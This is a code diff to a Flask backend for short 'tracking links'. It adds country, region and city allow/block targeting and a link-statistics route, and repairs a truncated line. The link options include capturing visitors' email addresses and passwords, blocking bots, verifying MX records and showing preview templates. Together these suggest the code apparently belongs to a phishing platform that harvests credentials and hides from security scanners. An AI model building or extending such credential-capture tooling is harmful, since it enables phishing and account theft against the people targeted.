@@ -46,6 +46,16 @@ def create_link():
         expiry_date = data.get("expiryDate")
         password = data.get("password", "")
         description = sanitize_input(data.get("description", ""))
+
+        # Geolocation fields
+        geo_targeting_enabled = data.get("geo_targeting_enabled", False)
+        geo_targeting_type = data.get("geo_targeting_type", "allow")
+        allowed_countries = data.get("allowed_countries", [])
+        blocked_countries = data.get("blocked_countries", [])
+        allowed_regions = data.get("allowed_regions", [])
+        blocked_regions = data.get("blocked_regions", [])
+        allowed_cities = data.get("allowed_cities", [])
+        blocked_cities = data.get("blocked_cities", [])
         
         short_url = ""
         if domain_type == "vercel":
@@ -213,9 +223,9 @@ def links():
                 short_code=short_code,
                 target_url=target_url,
                 campaign_name=campaign_name,
-                capture_email=capture_email,
-                capture_password=capture_password,
-                bot_blocking_enabled=bot_blocking_enabled,
+                capture_email=data.get("capture_email", False),
+                capture_password=data.get("capture_password", False),
+                bot_blocking_enabled=data.get("bot_blocking_enabled", True),
                 geo_targeting_enabled=geo_targeting_enabled,
                 geo_targeting_type=geo_targeting_type,
                 allowed_countries=json.dumps(allowed_countries) if allowed_countries else None,
@@ -224,11 +234,12 @@ def links():
                 blocked_regions=json.dumps(blocked_regions) if blocked_regions else None,
                 allowed_cities=json.dumps(allowed_cities) if allowed_cities else None,
                 blocked_cities=json.dumps(blocked_cities) if blocked_cities else None,
-                rate_limiting_enabled=rate_limiting_enabled,
-                dynamic_signature_enabled=dynamic_signature_enabled,
-                mx_verification_enabled=mx_verification_enabled,
-                preview_template_url=preview_template_url
+                rate_limiting_enabled=data.get("rate_limiting_enabled", False),
+                dynamic_signature_enabled=data.get("dynamic_signature_enabled", False),
+                mx_verification_enabled=data.get("mx_verification_enabled", False),
+                preview_template_url=data.get("preview_template_url", "")
             )
+
             
             db.session.add(link)
             db.session.commit()
@@ -463,8 +474,12 @@ def delete_link_by_id(link_id):
         print(f"Error deleting link: {e}")
         return jsonify({"success": False, "error": "Failed to delete tracking link"}), 500
 
-
-nify({"success": False, "error": "Authentication required"}), 401
+@links_bp.route('/stats', methods=['GET'])
+def get_user_stats():
+    """Get user's link statistics"""
+    user = get_current_user()
+    if not user:
+        return jsonify({"success": False, "error": "Authentication required"}), 401
 
     total_links = Link.query.filter_by(user_id=user.id).count()
     total_clicks = TrackingEvent.query.filter(TrackingEvent.link_id.in_([link.id for link in Link.query.filter_by(user_id=user.id).all()])).count()
